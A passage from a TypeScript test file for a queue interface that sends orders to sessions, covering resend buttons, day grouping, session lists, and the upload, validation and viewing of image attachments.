    { name: "one that can be resent → its own Resend only", receipts: ["received", "notReceived"], label: [], ids: [] },
  ];
  for (const row of resendAlls) {
    test(`resending several recipients: ${row.name}`, () => {
      const resent: unknown[] = [];
      const tree = render("OrderEntryQ", { entry: call<unknown[]>("getThreadEntriesQ", fan(row.receipts))[0], onResend: (ids: unknown) => resent.push(getPlain(ids)) });
      const all = findNodes(tree, (node) => node.type === "button" && /^Resend to /.test(collectText(node).trim()));
      assert.deepEqual(all.map((node) => collectText(node).trim()), row.label);
      if (all[0]) (all[0].props.onClick as () => void)();
      assert.deepEqual(resent, all[0] ? [row.ids] : []);
    });
  }

  // days are KST days: 15:30Z is already the next day in Seoul
  test("the thread's day labels group orders by KST day: Today, Yesterday, else the date", () => {
    const at = (answeredAt: string, id: number) => ({ id, item: { answeredAt }, copies: [] });
    const entries = [at("2026-11-10T03:00:00.000Z", 1), at("2026-11-11T14:59:00.000Z", 2), at("2026-11-11T15:01:00.000Z", 3), at("2026-11-12T15:30:00.000Z", 4)];
    const groups = call<Array<{ label: string; entries: Array<{ id: number }> }>>("getDayGroupsQ", entries, new Date("2026-11-12T16:00:00.000Z"));
    assert.deepEqual(groups.map((group) => [group.label, group.entries.map((entry) => entry.id)]), [["2026-11-10", [1]], ["2026-11-11", [2]], ["Yesterday", [3]], ["Today", [4]]]);
  });

  const toBars = [
    { name: "the ticked names, an ended one tagged", ids: [SESSION_ID, ENDED_ID], text: ["nightly-docs-sweep, atrium-hooks", "Ended"], clear: 1 },
    { name: "no tick says so and keeps no Clear to press", ids: [], text: ["No session ticked"], clear: 0 },
  ];
  for (const row of toBars) {
    test(`the To bar: ${row.name}`, () => {
      const tree = render("ToBarQ", { rows: SESSION_ROWS, selectedIds: row.ids, onClear: () => undefined });
      const text = collectText(tree);
      for (const part of row.text) assert.ok(text.includes(part), text);
      assert.equal(buttonLabelled(tree, "Clear").filter((node) => !node.props.hidden).length, row.clear);
    });
  }

  test("in the mode a rail row is the box's label: a press ticks it, and no row is the list's scope", () => {
    const toggled: unknown[] = [];
    const { tree } = renderRail({ toggle: (id: string) => toggled.push(id) }, { profile: "", session: SESSION_ID }, [], true);
    const row = railRowOf(tree, SESSION_ID);
    assert.equal(row.type, "label");
    const [box] = findNodes(row, (node) => node.type === "input" && node.props.type === "checkbox");
    (box?.props.onChange as () => void)();
    assert.deepEqual(toggled, [SESSION_ID]);
    assert.equal(findNodes(tree, (node) => node.props?.["aria-current"] === "true").length, 0);
  });
});

describe("sessions region", () => {
  test("the list read follows the Account filter and drops ticks on rows no longer listed or selectable", async () => {
    const urls: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      URLSearchParams,
      window: { UI: realUi },
      fetch: async (url: string) => {
        urls.push(url);
        return { status: 200, json: async () => ({ sessions: SESSION_ROWS, hasMore: false }) };
      },
    })) as ScreenModule;
    let region: unknown = realUi.INITIAL_REGION_STATE;
    let selectedIds = ["9b2e7c41-0d3a-4c55-8e1f-2a6b9c4d7e10", SESSION_ID, REPLACED_ID];
    await (module.getSessionsQ as (deps: unknown) => Promise<void>)({
      profile: "work dev",
      setRegion: (next: (prev: unknown) => unknown) => { region = next(region); },
      setSelectedIds: (next: (prev: string[]) => string[]) => { selectedIds = next(selectedIds); },
    });
    assert.deepEqual(urls, ["/api/queue/owner/sessions?profile=work+dev"]);
    assert.equal((getPlain(region) as { data: { sessions: unknown[] } }).data.sessions.length, 3);
    assert.deepEqual(getPlain(selectedIds), [SESSION_ID]);
  });

  const views = [
    { name: "a failed read shows the shared region failure with Retry", region: { status: "error", data: null, error: "HTTP 503 database_unavailable", busy: false }, atom: "RegionUnavailable" },
    { name: "no session at all shows the empty state", region: { status: "ready", data: { sessions: [], hasMore: false }, error: null, busy: false }, atom: "EmptyState" },
    { name: "a loaded list shows the session rows", region: buildSessions().region, atom: "row" },
  ];
  for (const view of views) {
    test(view.name, () => {
      const { tree } = renderRail({ region: view.region });
      assert.equal(findNodes(tree, (node) => node.props?.atom === view.atom || (view.atom === "row" && node.props?.["data-session"] === SESSION_ID)).length, 1);
    });
  }

  test("the desk reads Sessions, then the list, then the sheet, and the recent resumes open from the Sessions foot", () => {
    const tree = render("QueueDeskQ", { queue: withList(buildQueue().queue, [buildItem({ id: 1 })]) });
    const order = findNodes(tree, (node) => ["SessionsRegionQ", "RecentResumesQ", "QueueListQ", "QueueSheetQ"].includes(node.type)).map((node) => node.type);
    assert.deepEqual(order, ["SessionsRegionQ", "QueueListQ", "QueueSheetQ"]);
  });
});

test("a row's age carries no verb", () => {
  const rows = call<Array<{ rows: unknown[] }>>("getGroupsQ", [buildItem({ id: 1 }), buildItem({ id: 2, kind: "message", status: "delivered", sendId: "s" })]).flatMap((group) => group.rows);
  for (const row of rows) {
    const text = collectText(render("QueueRowQ", { row, isSelected: false, view: { isNameShown: true, isAccountShown: false }, onSelect: () => undefined }));
    assert.doesNotMatch(text, /\b(asked|sent)\b/, text);
  }
});

// Real 3 × 2 files, the same bytes the upload route's own tests store; WebP is a real 1 × 1 lossless file
const SAMPLE_IMAGE = {
  png: Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAMAAAACCAIAAAASFvFNAAAAEElEQVR4nGP4z8AAQQxwFgBB0gX7h/C5SAAAAABJRU5ErkJggg==", "base64"),
  gif: Buffer.from("R0lGODdhAwACAJEAAAAAAP8AAP///wAAACH5BAQAAAAALAAAAAADAAIAAAICjF8AOw==", "base64"),
  webp: Buffer.from("UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==", "base64"),
  jpeg: Buffer.from("/9j/4AAQSkZJRgABAQAASABIAAD/wAARCAACAAMDASIAAhEBAxEB/9oADAMBAAIRAxEAPwD4vooor+Uz/fw//9k=", "base64"),
} as const;
const IMAGE_ID = ["0b6f3c1e-7a2d-4e8b-9c5f-1d2e3f4a5b6c", "1c7a4d2f-8b3e-4f9c-8d6a-2e3f4a5b6c7d", "2d8b5e3a-9c4f-4a0d-9e7b-3f4a5b6c7d8e"];
const shot = (index: number, fields: Record<string, unknown> = {}) => ({ key: `s${index}`, name: `shot-${index + 1}.png`, bytes: 1258291, status: "stored", id: IMAGE_ID[index], src: `/api/queue/owner/images/${IMAGE_ID[index]}`, ...fields });

describe("images in a composer", () => {
  const IMAGES = vm.runInContext("IMAGES_Q", screen) as { MAX: number; BYTES_MAX: number; NAME_MAX: number };

  // the page checks a file before it uploads it → it may refuse less than the server, never more
  const sniffs = [
    ...Object.entries(SAMPLE_IMAGE).map(([type, bytes]) => ({ name: `a real ${type}`, bytes })),
    { name: "a PDF renamed .png", bytes: Buffer.from("%PDF-1.7\n1 0 obj << >> endobj\n") },
    { name: "an SVG", bytes: Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"></svg>') },
    { name: "an empty file", bytes: Buffer.alloc(0) },
  ];
  for (const row of sniffs) {
    test(`the page reads the type from the bytes as the server does: ${row.name}`, () => {
      assert.equal(call("getImageTypeQ", new Uint8Array(row.bytes)), getImageFacts(row.bytes)?.type ?? null);
    });
  }

  test("the page's limits are the server's: 8 ids pass a reply and 9 do not, 10 MB is the upload cap, a long or two-line name still passes", () => {
    const ids = (count: number) => Array.from({ length: count }, () => randomUUID());
    assert.equal(replyBodySchema.safeParse({ text: "see the shots", attachmentIds: ids(IMAGES.MAX) }).success, true);
    assert.equal(replyBodySchema.safeParse({ text: "see the shots", attachmentIds: ids(IMAGES.MAX + 1) }).success, false);
    assert.equal(IMAGES.BYTES_MAX, IMAGE_BYTES_MAX);
    for (const name of [`${"화면".repeat(200)}.png`, "line one\nline two.png", "\t"]) {
      assert.equal(imageUploadQuerySchema.safeParse({ name: call("getUploadNameQ", name) }).success, true, JSON.stringify(name));
    }
  });

  const file = (name: string, type: string | null, bytes = 1258291) => ({ name, type, bytes });
  // spec §9.8 → Limits: the files that pass are still added; one line says what was not
  const plans = [
    { name: "three images to an empty box are all added", count: 0, files: [file("a.png", "png"), file("b.jpg", "jpeg"), file("c.webp", "webp")], added: ["a.png", "b.jpg", "c.webp"], line: null },
    { name: "past eight the rest are counted", count: 6, files: [file("a.png", "png"), file("b.png", "png"), file("c.png", "png"), file("d.png", "png")], added: ["a.png", "b.png"], line: "Up to 8 images per order: 2 were not added." },
    { name: "a PDF is named", count: 0, files: [file("plan.pdf", null), file("a.png", "png")], added: ["a.png"], line: "plan.pdf was not added: only PNG, JPEG, WebP or GIF images." },
    { name: "a file over 10 MB is named", count: 0, files: [file("shot-12.png", "png", 10 * 1024 * 1024 + 1)], added: [], line: "shot-12.png was not added: over 10 MB." },
    { name: "exactly 10 MB passes", count: 0, files: [file("big.png", "png", 10 * 1024 * 1024)], added: ["big.png"], line: null },
    { name: "several refused at once are counted", count: 0, files: [file("plan.pdf", null), file("logo.svg", null), file("huge.png", "png", 11 * 1024 * 1024)], added: [], line: "3 files were not added: only PNG, JPEG, WebP or GIF images, up to 10 MB each." },
    { name: "a refused type and the cap together are counted", count: 7, files: [file("plan.pdf", null), file("a.png", "png"), file("b.png", "png")], added: ["a.png"], line: "2 files were not added: only PNG, JPEG, WebP or GIF images, up to 10 MB each and 8 per order." },
  ];
  for (const row of plans) {
    test(`adding files: ${row.name}`, () => {
      const plan = call<{ added: Array<{ name: string }>; refusal: string | null }>("getAddPlanQ", row.count, row.files);
      assert.deepEqual([plan.added.map((one) => one.name), plan.refusal], [row.added, row.line]);
    });
  }

  const counts = [
    { name: "three images in MB", shots: [shot(0), shot(1), shot(2, { bytes: 1258292 })], line: "3 images · 3.6 MB" },
    { name: "one small image in KB", shots: [shot(0, { bytes: 300 * 1024 })], line: "1 image · 300 KB" },
  ];
  for (const row of counts) test(`the count after the thumbnails: ${row.name}`, () => assert.equal(call("getImageCountLineQ", row.shots), row.line));

  // spec §9.8 / §10: what the note slot says about the images, when nothing else is said there
  const notes = [
    { name: "a file hangs over the box", shots: [shot(0)], isOver: true, note: { tone: "info", text: "Drop to add images.", retryKey: null } },
    { name: "a failed upload names the file and its cause, with Try again", shots: [shot(0), shot(2, { status: "failed", id: undefined, cause: "the monitor did not answer" })], isOver: false, note: { tone: "crit", text: "shot-3.png could not be uploaded: the monitor did not answer.", retryKey: "s2" } },
    { name: "uploads still running are counted", shots: [shot(0, { status: "uploading" }), shot(1, { status: "uploading" }), shot(2)], isOver: false, note: { tone: "info", text: "Uploading 2 images…", retryKey: null } },
    { name: "every image stored says nothing", shots: [shot(0)], isOver: false, note: null },
  ];
  for (const row of notes) test(`the image note: ${row.name}`, () => assert.deepEqual(call("getImageNoteQ", row.shots, row.isOver), row.note));

  const upload = async (status: number, answer: unknown) => {
    const requests: Array<{ url: string; method: string; type: string; body: unknown }> = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      URL: { createObjectURL: () => "blob:queue/1", revokeObjectURL: () => undefined },
      fetch: async (url: string, init: { method: string; headers: Record<string, string>; body: unknown }) => {
        requests.push({ url, method: init.method, type: init.headers["Content-Type"], body: init.body });
        return { status, json: async () => answer };
      },
    })) as ScreenModule;
    const png = new File([SAMPLE_IMAGE.png], "shot 1.png", { type: "image/heic" });
    let shots: unknown[] = [];
    const errors: unknown[] = [];
    await (module.putFilesQ as (deps: unknown) => Promise<void>)({
      files: [png], shots: [], setShots: (next: (prev: unknown[]) => unknown[]) => { shots = next(shots); }, putError: (error: unknown) => errors.push(error),
    });
    return { requests, shots: getPlain(shots) as Array<Record<string, unknown>>, errors, png };
  };

  test("an added image is uploaded as raw bytes under a fixed type with its name as a label, and its thumbnail then shows the stored copy", async () => {
    const result = await upload(201, { id: IMAGE_ID[0], name: "shot 1.png", type: "png", bytes: 76, width: 3, height: 2 });
    assert.deepEqual(result.requests.map(({ url, method, type }) => [url, method, type]), [["/api/queue/owner/images?name=shot%201.png", "POST", "application/octet-stream"]]);
    assert.equal(result.requests[0]?.body, result.png);
    assert.deepEqual(result.shots.map(({ name, status, id, src }) => ({ name, status, id, src })), [{ name: "shot 1.png", status: "stored", id: IMAGE_ID[0], src: `/api/queue/owner/images/${IMAGE_ID[0]}` }]);
    assert.deepEqual(result.errors, [null]);
  });

  test("a refused upload keeps the thumbnail as failed with the server's cause", async () => {
    const result = await upload(415, { error: "unsupported_image", reason: "only PNG, JPEG, WebP or GIF images are taken" });
    assert.deepEqual(result.shots.map(({ status, cause }) => ({ status, cause })), [{ status: "failed", cause: "only PNG, JPEG, WebP or GIF images are taken" }]);
  });

  const report = (draft: Record<string, unknown>) => {
    const { calls, queue } = buildQueue();
    return { calls, tree: render("SheetFootQ", { item: buildItem({ kind: "report" }), draft, queue, isBusy: false, error: null }) };
  };

  test("a report's box shows each image with its remove button and the count, and takes more by its Add images button", () => {
    const { tree } = report({ text: "", images: [shot(0), shot(1)] });
    assert.deepEqual(findNodes(tree, (node) => node.type === "img").map((node) => [node.props.alt, node.props.src]), [["shot-1.png", shot(0).src], ["shot-2.png", shot(1).src]]);
    assert.deepEqual(findNodes(tree, (node) => /^Remove /.test(String(node.props?.["aria-label"]))).map((node) => node.props["aria-label"]), ["Remove shot-1.png", "Remove shot-2.png"]);
    assert.ok(collectText(tree).includes("2 images · 2.4 MB"), collectText(tree));
    assert.equal(findNodes(tree, (node) => node.props?.["aria-label"] === "Add images").length, 1);
    const [input] = findNodes(tree, (node) => node.type === "input" && node.props.type === "file");
    assert.deepEqual([input?.props.accept, input?.props.multiple], ["image/png,image/jpeg,image/webp,image/gif", true]);
  });

  test("a decision's box takes no images", () => {
    const tree = render("SheetFootQ", { item: buildItem(), draft: {}, queue: buildQueue().queue, isBusy: false, error: null });
    assert.equal(findNodes(tree, (node) => node.props?.["aria-label"] === "Add images").length, 0);
  });

  // spec §8: an image counts as content for the ink and for Mark as read; an order is text, so images alone are refused
  const reportRows = [
    { name: "images alone put the ink on Send order", draft: { images: [shot(0)] }, press: null, ink: "Send order", calls: [] },
    { name: "Mark as read with an image in the box says the order is unsent", draft: { images: [shot(0)] }, press: "Mark as read", ink: "Send order", calls: [["setDraft", 41, { error: "Unsent order in the field. Send it, or clear it first." }]] },
    { name: "Send order with images and no text asks for the order", draft: { images: [shot(0)] }, press: "Send order", ink: "Send order", calls: [["setDraft", 41, { error: "Write the order, then send." }]] },
    { name: "Send order with text and stored images sends their ids in order", draft: { text: "see the red box", images: [shot(1), shot(0)] }, press: "Send order", ink: "Send order", calls: [["settle", 41, "reply", { text: "see the red box", attachmentIds: [IMAGE_ID[1], IMAGE_ID[0]] }]] },
  ];
  for (const row of reportRows) {
    test(`a report with images: ${row.name}`, () => {
      const { calls, tree } = report(row.draft);
      const buttons = findNodes(tree, (node) => node.type === "button" && /\bbtn lg\b/.test(String(node.props.className)));
      assert.deepEqual(buttons.filter((node) => /\bprimary\b/.test(String(node.props.className))).map((node) => collectText(node)), [row.ink]);
      if (row.press) (buttonLabelled(tree, row.press)[0]?.props.onClick as () => void)();
      assert.deepEqual(getPlain(calls), row.calls);
    });
  }

  test("an order send with stored images posts their ids beside the text", async () => {
    const posts: unknown[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (_url: string, init: { body: string }) => { posts.push(JSON.parse(init.body)); return { status: 201, json: async () => ({ items: [] }) }; },
    })) as ScreenModule;
    let composer: Record<string, unknown> = { text: "rebase on main", isBusy: false, error: null, images: [shot(0)] };
    await (module.sendMessageQ as (deps: unknown) => Promise<boolean>)({
      body: { sessionIds: [SESSION_ID], text: "rebase on main" }, names: ["gersona"], shots: [shot(0)],
      setComposer: (next: (prev: Record<string, unknown>) => Record<string, unknown>) => { composer = next(composer); }, setStatus: () => undefined, onSent: () => undefined,
    });
    assert.deepEqual(getPlain(posts), [{ sessionIds: [SESSION_ID], text: "rebase on main", attachmentIds: [IMAGE_ID[0]] }]);
    assert.deepEqual(getPlain(composer), { text: "", isBusy: false, error: null });
  });

  test("an order send with an image that failed to upload posts nothing and keeps the box", async () => {
    const posts: unknown[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (_url: string, init: { body: string }) => { posts.push(JSON.parse(init.body)); return { status: 201, json: async () => ({ items: [] }) }; },
    })) as ScreenModule;
    const failed = shot(0, { status: "failed", id: undefined, cause: "the monitor did not answer" });
    let composer: Record<string, unknown> = { text: "rebase on main", isBusy: false, error: null, images: [failed] };
    const isDone = await (module.sendMessageQ as (deps: unknown) => Promise<boolean>)({
      body: { sessionIds: [SESSION_ID], text: "rebase on main" }, names: ["gersona"], shots: [failed],
      setComposer: (next: (prev: Record<string, unknown>) => Record<string, unknown>) => { composer = next(composer); }, setStatus: () => undefined, onSent: () => undefined,
    });
    assert.deepEqual([isDone, posts.length, (getPlain(composer) as { text: string; isBusy: boolean }).text, (getPlain(composer) as { isBusy: boolean }).isBusy], [false, 0, "rebase on main", false]);
  });
});

describe("images in an order's bubble", () => {
  const images = [0, 1, 2].map((index) => ({ id: IMAGE_ID[index], name: `shot-${index + 1}.png`, type: "png", bytes: 1258291, width: 2880, height: 1800 }));
  const order = buildItem({ id: 81, kind: "message", title: "Order", body: "see the red box", options: [], status: "delivered", answeredAt: "2026-11-13T05:40:00.000Z", attachments: images });

  test("the images sit inside the bubble under the text, each a button naming its place and file that opens the viewer at it", () => {
    const opened: unknown[] = [];
    const tree = render("OrderEntryQ", { entry: { id: 81, item: order, copies: [order] }, onResend: () => undefined, onOpenImage: (...args: unknown[]) => opened.push(args) });
    const [bubble] = findNodes(tree, (node) => String(node.props?.className).startsWith("queue-bubble"));
    assert.ok(bubble, "bubble rendered");
    const buttons = findNodes(bubble as RenderedNode, (node) => node.type === "button" && /^Open image /.test(String(node.props["aria-label"])));
    assert.deepEqual(buttons.map((node) => node.props["aria-label"]), ["Open image 1 of 3: shot-1.png", "Open image 2 of 3: shot-2.png", "Open image 3 of 3: shot-3.png"]);
    assert.deepEqual(findNodes(bubble as RenderedNode, (node) => node.type === "img").map((node) => node.props.src), images.map((image) => `/api/queue/owner/images/${image.id}`));
    (buttons[1]?.props.onClick as () => void)();
    assert.deepEqual(getPlain(opened), [[images, 1]]);
  });

  test("an order with no images draws no image row", () => {
    const tree = render("OrderEntryQ", { entry: { id: 82, item: { ...order, attachments: [] }, copies: [order] }, onResend: () => undefined, onOpenImage: () => undefined });
    assert.equal(findNodes(tree, (node) => node.type === "img").length, 0);
  });

  test("the viewer shows one image fitted in the fullscreen surface with its name, size and place", () => {
    const tree = render("ImageViewerQ", { images, index: 1, onStep: () => undefined, onClose: () => undefined });
    const [surface] = findNodes(tree, (node) => node.props?.atom === "DetailSurface");
    assert.equal(surface?.props.variant, "fullscreen");
    assert.deepEqual(findNodes(tree, (node) => node.type === "img").map((node) => [node.props.src, node.props.alt]), [[`/api/queue/owner/images/${IMAGE_ID[1]}`, "shot-2.png"]]);
    assert.ok(collectText(tree).includes("shot-2.png · 1.2 MB · 2 of 3"), collectText(tree));
  });

  // spec §9.8 → Opening one large: Left / Right step through one order's images and stop at its ends
  const steps = [
    { name: "Right moves to the next", index: 0, key: "ArrowRight", next: 1 },
    { name: "Left moves to the previous", index: 2, key: "ArrowLeft", next: 1 },
    { name: "Right on the last stays", index: 2, key: "ArrowRight", next: null },
    { name: "Left on the first stays", index: 0, key: "ArrowLeft", next: null },
    { name: "another key does not step", index: 1, key: "ArrowDown", next: null },
  ];
  for (const row of steps) test(`viewer keys: ${row.name}`, () => assert.equal(call("getSteppedIndexQ", row.index, 3, row.key), row.next));
});
